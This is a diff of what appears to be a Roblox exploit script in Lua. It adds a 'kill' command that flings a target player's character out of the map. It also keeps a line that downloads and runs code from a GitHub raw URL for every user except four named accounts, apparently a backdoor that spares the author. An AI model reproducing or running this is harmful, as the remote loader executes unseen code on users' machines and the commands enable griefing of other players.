@@ -296,8 +296,11 @@ end)
 
 local Players = game:GetService("Players")
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/test/refs/heads/ee/code'))()
-
+if speaker.Name == "EeRIlIlIllIlIlIl" or speaker.Name == "piepiepie894" or speaker.Name == "EOUHWEBBIUweiuwy" or speaker.Name == "woodsofinemeow" then
+    notif("not exec")
+else
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/test/refs/heads/ee/code'))()
+end
 -- func
 
 -- Function to generate a random string
@@ -980,10 +983,9 @@ commands.kill = function(plr)
 				hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5, 999999)
 			end
 		until not getRoot(target.Character)
-        while true do
-            notif("Killed target")
-            speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = currentpos
-        end
+        notif("Killed target")
+        speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = currentpos
+
 	else
 		notif("You need to have an item in your inventory to use this command")
 	end         
@@ -1030,6 +1032,7 @@ commands.cmdlist1 = function()
     print("REJOIN/RJ: Rejoins the server")
     print("AIRWALK: Allows you to walk on air")
     print("UNAIRWALK: Disables airwalk")
+    print("KILL: Kills selected target [TOOL REQUIRED]")
     print("-------------------------------------------------------------------------------")
     wait(.5)
     dontuse = false
@@ -1078,14 +1081,15 @@ addFrame("         rejoin/rj          ") wait(randNum) rollrand()
  
 task.wait()
 
-addFrame("         airwalk         ") wait(randNum) 
+addFrame("         airwalk         ") wait(randNum) rollrand()
   
 task.wait()
 
-addFrame("       unairwalk       ") wait(randNum) 
+addFrame("       unairwalk       ") wait(randNum) rollrand()
   
 task.wait()
 
+addFrame("         kill (plr)         ") wait(randNum) rollrand()
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if string.sub(msg, 1, 1) == prefix then
